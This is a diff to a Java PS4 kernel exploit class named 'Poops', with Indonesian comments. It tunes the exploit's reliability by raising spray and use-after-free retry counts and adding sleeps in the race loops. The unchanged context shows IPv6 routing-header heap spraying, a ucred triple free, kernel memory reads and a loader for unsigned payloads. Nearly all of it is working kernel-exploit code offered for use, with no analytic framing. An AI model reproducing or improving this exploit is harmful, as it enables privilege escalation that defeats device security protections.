@@ -21,8 +21,8 @@ public class Poops {
     private static final int IOV_SIZE = 0x10;
 
     private static final int IPV6_SOCK_NUM = 128;
-    private static final int TWIN_TRIES = 15000;
-    private static final int UAF_TRIES = 50000;
+	private static final int TWIN_TRIES   = 25000;
+	private static final int UAF_TRIES    = 80000;
     private static final int KQUEUE_TRIES = 300000;
     private static final int IOV_THREAD_NUM = 4;
     private static final int UIO_THREAD_NUM = 4;
@@ -507,53 +507,55 @@ public class Poops {
         }
     }
 
-    private static boolean findTwins(int timeout) {
-        while (timeout-- != 0) {
-            for (int i = 0; i < ipv6Socks.length; i++) {
-                sprayRthdr.putInt(0x04, RTHDR_TAG | i);
-                setRthdr(ipv6Socks[i], sprayRthdr, sprayRthdrLen);
-            }
+	private static boolean findTwins(int timeout) {
+		while (timeout-- != 0) {
+			// Spray phase
+			for (int i = 0; i < ipv6Socks.length; i++) {
+				sprayRthdr.putInt(0x04, RTHDR_TAG | i);
+				setRthdr(ipv6Socks[i], sprayRthdr, sprayRthdrLen);
+			}
+			try { Thread.sleep(1); } catch (Exception ignored) {}   // ← TAMBAHAN INI
 
-            for (int i = 0; i < ipv6Socks.length; i++) {
-                leakRthdrLen.set(Int64.SIZE);
-                getRthdr(ipv6Socks[i], leakRthdr, leakRthdrLen);
-                int val = leakRthdr.getInt(0x04);
-                int j = val & 0xFFFF;
-                if ((val & 0xFFFF0000) == RTHDR_TAG && i != j) {
-                    twins[0] = i;
-                    twins[1] = j;
-                    return true;
-                }
-            }
-        }
-        return false;
-    }
+			// Check phase
+			for (int i = 0; i < ipv6Socks.length; i++) {
+				leakRthdrLen.set(Int64.SIZE);
+				getRthdr(ipv6Socks[i], leakRthdr, leakRthdrLen);
+				int val = leakRthdr.getInt(0x04);
+				int j = val & 0xFFFF;
+				if ((val & 0xFFFF0000) == RTHDR_TAG && i != j) {
+					twins[0] = i;
+					twins[1] = j;
+					return true;
+				}
+			}
+			try { Thread.sleep(1); } catch (Exception ignored) {}   // ← TAMBAHAN INI (opsional tapi bagus)
+		}
+		return false;
+	}
 
-    private static int findTriplet(int master, int other, int timeout) {
-        while (timeout-- != 0) {
-            for (int i = 0; i < ipv6Socks.length; i++) {
-                if (i == master || i == other) {
-                    continue;
-                }
-                sprayRthdr.putInt(0x04, RTHDR_TAG | i);
-                setRthdr(ipv6Socks[i], sprayRthdr, sprayRthdrLen);
-            }
+	private static int findTriplet(int master, int other, int timeout) {
+		while (timeout-- != 0) {
+			for (int i = 0; i < ipv6Socks.length; i++) {
+				if (i == master || i == other) continue;
+				sprayRthdr.putInt(0x04, RTHDR_TAG | i);
+				setRthdr(ipv6Socks[i], sprayRthdr, sprayRthdrLen);
+			}
+			try { Thread.sleep(1); } catch (Exception ignored) {}   // ← TAMBAHAN
 
-            for (int i = 0; i < ipv6Socks.length; i++) {
-                if (i == master || i == other) {
-                    continue;
-                }
-                leakRthdrLen.set(Int64.SIZE);
-                getRthdr(ipv6Socks[master], leakRthdr, leakRthdrLen);
-                int val = leakRthdr.getInt(0x04);
-                int j = val & 0xFFFF;
-                if ((val & 0xFFFF0000) == RTHDR_TAG && j != master && j != other) {
-                    return j;
-                }
-            }
-        }
-        return -1;
-    }
+			for (int i = 0; i < ipv6Socks.length; i++) {
+				if (i == master || i == other) continue;
+				leakRthdrLen.set(Int64.SIZE);
+				getRthdr(ipv6Socks[master], leakRthdr, leakRthdrLen);
+				int val = leakRthdr.getInt(0x04);
+				int j = val & 0xFFFF;
+				if ((val & 0xFFFF0000) == RTHDR_TAG && j != master && j != other) {
+					return j;
+				}
+			}
+			try { Thread.sleep(1); } catch (Exception ignored) {}   // ← TAMBAHAN
+		}
+		return -1;
+	}
 
     private static long kreadSlow64(long address) {
         return kreadSlow(address, Int64.SIZE).getLong(0x00);
@@ -653,6 +655,7 @@ public class Poops {
                     break;
                 }
                 close(kq);
+				try { Thread.sleep(1); } catch (Exception ignored) {}
             }
 
             if (timeout <= 0)
@@ -666,7 +669,8 @@ public class Poops {
             close(kq);
 
             // Find triplet.
-            triplets[1] = findTriplet(triplets[0], triplets[2], UAF_TRIES);
+            Thread.sleep(1);
+			triplets[1] = findTriplet(triplets[0], triplets[2], UAF_TRIES);
             if (triplets[1] == -1)
             {
                 console.println("kqueue triplets 1 failed ");
@@ -815,13 +819,14 @@ public class Poops {
             setuid(1);
             clearBuf.putInt(0x00, uafSock);
             __sys_netcontrol(-1, NET_CONTROL_NETEVENT_CLEAR_QUEUE, clearBuf, clearBuf.size());
-            for (int i = 0; i < 32; i++) {
-                iovState.signalWork(0);
-                sched_yield();
-                write(iovSs1, tmp, Int8.SIZE);
-                iovState.waitForFinished();
-                read(iovSs0, tmp, Int8.SIZE);
-            }
+			for (int i = 0; i < 32; i++) {
+				iovState.signalWork(0);
+				sched_yield();
+				try { Thread.sleep(0); } catch (Exception ignored) {}   // sleep(0) = yield lebih halus
+				write(iovSs1, tmp, Int8.SIZE);
+				iovState.waitForFinished();
+				read(iovSs0, tmp, Int8.SIZE);
+			}
             close(dup(uafSock));
             if (!findTwins(TWIN_TRIES))
             {
@@ -831,18 +836,20 @@ public class Poops {
 
             freeRthdr(ipv6Socks[twins[1]]);
             int timeout = UAF_TRIES;
-            while (timeout-- > 0) {
-                iovState.signalWork(0);
-                sched_yield();
-                leakRthdrLen.set(Int64.SIZE);
-                getRthdr(ipv6Socks[twins[0]], leakRthdr, leakRthdrLen);
-                if (leakRthdr.getInt(0x00) == 1) {
-                    break;
-                }
-                write(iovSs1, tmp, Int8.SIZE);
-                iovState.waitForFinished();
-                read(iovSs0, tmp, Int8.SIZE);
-            }
+			while (timeout-- > 0) {
+				iovState.signalWork(0);
+				sched_yield();
+				try { Thread.sleep(1); } catch (Exception ignored) {}     // ← TAMBAHAN PALING PENTING
+
+				leakRthdrLen.set(Int64.SIZE);
+				getRthdr(ipv6Socks[twins[0]], leakRthdr, leakRthdrLen);
+				if (leakRthdr.getInt(0x00) == 1) {
+					break;
+				}
+				write(iovSs1, tmp, Int8.SIZE);
+				iovState.waitForFinished();
+				read(iovSs0, tmp, Int8.SIZE);
+			}
             if (timeout <= 0)
             {
                 console.println("iov reclaim failed");
@@ -938,7 +945,7 @@ public class Poops {
             cleanup();
             return -3;
         }
-        console.println("Initial triple free");
+        console.println("Initial triple free\nJika diam disini > 30 detik, Tahan tombol PS -> Power -> Restart PS4");
         if (!triggerUcredTripleFree()) {
             cons.println("triple free failed");
             cleanup();
@@ -967,7 +974,7 @@ public class Poops {
         }
 
         cleanup();
-
+        NativeInvoke.sendNotificationRequest("Berhasil");
         BinLoader.start();
 
         return 0;
